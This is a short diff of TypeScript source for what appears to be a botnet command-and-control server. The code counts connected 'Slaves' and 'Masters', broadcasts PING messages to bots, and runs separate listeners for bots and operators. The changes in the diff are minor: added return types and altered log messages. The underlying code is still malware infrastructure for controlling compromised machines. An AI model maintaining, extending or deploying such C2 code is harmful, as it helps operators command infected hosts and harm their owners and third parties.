@@ -37,7 +37,7 @@ function BotsConnected() : number {
   return clients.length;
 }
 
-function TitleWriter(socket) {
+function TitleWriter(socket) : void {
   socket.write(`\x1b]0;Slaves Connected: ${BotsConnected()} | Masters Connected: ${OperatorsConnected}\x07`);
 }
 
@@ -51,7 +51,7 @@ const broadcast = async (msg) => {
   });
 };
 
-function removeClient(socket) {
+function removeClient(socket) : void {
   let client = clients.filter(c => c.socket === socket)[0];
   if(client) {
     clients.splice(clients.indexOf(client), 1); // Remove client
@@ -103,11 +103,12 @@ function create_and_bind(port : number) {
   }).listen(port);
 
   botserver.on("listening", () => {
+    console.log('Slave server listening on port ' + port);
     setInterval(() => broadcast("PING\n"), 60000);
   });
 }
 
-function BotWorker(port: number) {
+function BotWorker(port: number) : void {
   cncserver = net.createServer(async function (socket) { // Connection
     let twint; // title writer int (id)
     OperatorsConnected++;
@@ -227,7 +228,7 @@ function BotWorker(port: number) {
   }).listen(port);
 
   cncserver.on('listening', () => {
-    console.log('listening on port ' + port);
+    console.log('CNC listening on port ' + port);
   })
 }
 
@@ -243,7 +244,6 @@ async function main() {
 
   port = Number(process.argv[4]);
   threads = Number(process.argv[3]);
-  console.log('Bot Port', process.argv[2], 'CNC Port', port);
   create_and_bind(Number(process.argv[2])); // Bot port
   BotWorker(port); // cnc port
 
